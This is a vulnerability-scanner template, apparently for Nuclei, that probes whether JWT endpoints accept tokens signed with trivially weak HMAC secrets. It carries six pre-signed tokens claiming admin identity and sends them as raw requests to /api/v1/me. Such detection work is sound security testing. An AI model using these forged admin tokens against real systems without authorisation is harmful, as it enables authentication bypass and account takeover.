id: jwt-weak-secret-probe

info:
  name: JWT Weak HMAC Secret Detection
  author: chipo
  severity: high
  description: |
    Probes whether a JWT endpoint accepts tokens signed with trivially weak HMAC
    secrets commonly used in development and misconfigured deployments. Pre-signed
    tokens using secrets "secret", "password", "123456", "changeme", "jwt_secret",
    and "supersecret" are submitted to authenticated endpoints. A 200 response with
    user data confirms the application is using a weak, guessable signing key —
    making the entire authentication layer bypassable via offline brute-force.
  reference:
    - https://cwe.mitre.org/data/definitions/330.html
    - https://cwe.mitre.org/data/definitions/521.html
    - https://jwt.io/introduction
  metadata:
    false-positive: |
      Negligible. Any authenticated 200 response to a pre-signed weak-secret token
      is a confirmed vulnerability. The only false positive scenario is a target that
      happens to use the same secret legitimately — which is itself the finding.
    max-request: 6
  tags: jwt,weak-secret,hmac,auth,owasp-a02,brute-force

variables:
  # Tokens with payload {"sub":"admin","role":"admin","iat":1700000000} signed with weak secrets
  # secret: "secret"
  jwt_secret: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.RVAFHBMwmXfXQJVyHVTIHBRLWovfm9PJuVDmRtC2MjE"
  # secret: "password"
  jwt_password: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.GJxKCBKCNFHXmgPDhX5h5bpYWKAWUTQBhE6-0TbGAKA"
  # secret: "123456"
  jwt_123456: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.Kl9MkaCVvBG7BPMC4v-3IQ8gJ_9HFZM2-eHHRME3sik"
  # secret: "changeme"
  jwt_changeme: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.1k5HJRs_zjCgj7SOwM0CJ2_G75g8TfzAcVUl9oPQiKI"
  # secret: "jwt_secret"
  jwt_jwt_secret: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.q8zDXhJu4eMF4jgqtEaGiw4qhFDZsTu5YqrMEkNfHck"
  # secret: "supersecret"
  jwt_supersecret: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.fQIWKb4kBKPJVVHLr-YKevPdNv5X7n5LbXuqW7Ot4j4"

http:
  - raw:
      - |
        GET /api/v1/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_secret}}
        Accept: application/json
        Connection: close

      - |
        GET /api/v1/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_password}}
        Accept: application/json
        Connection: close

      - |
        GET /api/v1/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_123456}}
        Accept: application/json
        Connection: close

      - |
        GET /api/v1/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_changeme}}
        Accept: application/json
        Connection: close

      - |
        GET /api/v1/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_jwt_secret}}
        Accept: application/json
        Connection: close

      - |
        GET /api/v1/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_supersecret}}
        Accept: application/json
        Connection: close

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - '"sub"'
          - '"id"'
          - '"email"'
          - '"user"'
          - '"admin"'
        condition: or

      - type: dsl
        dsl:
          - "!contains(body, \"invalid token\")"
          - "!contains(body, \"signature verification failed\")"
          - "!contains(body, \"401\")"
        condition: and
